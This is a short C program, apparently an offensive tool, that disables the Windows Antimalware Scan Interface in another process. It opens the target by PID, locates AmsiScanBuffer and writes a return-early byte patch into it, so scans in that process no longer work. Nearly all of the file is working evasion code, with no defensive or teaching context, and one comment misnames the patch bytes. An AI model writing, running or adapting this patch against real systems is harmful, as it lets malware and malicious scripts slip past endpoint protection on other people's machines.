//why writeprocessmemory works without virtualallocex: https://devblogs.microsoft.com/oldnewthing/20181206-00/?p=100415

#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {

#if _WIN64 
    char patching[3] = { 0x29, 0xC0, 0xC3 }; //xor eax, eax; ret
    //method2: char patching[6] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};
#else
    char patching[8] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00};
#endif
    int pid;
    DWORD old, old2;
    HMODULE amsi_addr;
    HANDLE pi;    
    LPVOID  addr;
    BOOL st;

    pid = atoi(argv[1]);
    pi = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!pi)
        printf("%s : %d\n", "Failed to open process", GetLastError());

    //Loading AMSI in the current process
    //getchar();
    amsi_addr = LoadLibrary(L"amsi");
    if (!amsi_addr)
        printf("%s : %d\n", "Opening Handle to Amsi Module Failed", GetLastError());

    //Getting the address of AmsiScanBuffer()
    addr = GetProcAddress(amsi_addr, "AmsiScanBuffer");
    if (!addr)
        printf("%s : %d\n", "Failed to find AmsiScanBuffer Address", GetLastError());
    printf("[+] AmsiScanBuffer located at %x\n", addr);

    //Changing the first 6 bytes of AmsiScanBuffer() to RWX 
    /*st = VirtualProtect(addr, sizeof(patching), PAGE_EXECUTE_READWRITE, &old);
    if (!st)
        printf("%s : %d\n", "Failed to change AmsiScanBuffer() region to RWX", GetLastError());
    printf("[+] Changing Memory Protection to ReadWriteExecutable\n");
    getchar();*/

    //Patching AMSI on remote process
    //getchar();
    st = WriteProcessMemory(pi, addr, patching, sizeof(patching), nullptr);
    if (!st)
        printf("%s : %d\n", "Failed to patch AMSI", GetLastError());
    printf("[+] Patching AmsiScanBuffer()\n");
    //getchar();

    //Returning AmsiScanBuffer() memory to old permissions
    //VirtualProtect(addr, sizeof(patching), old, &old2);
    //getchar();

    printf("[+] Successfully disabled AMSI in process : %d\n", pid);
    return 0;
}
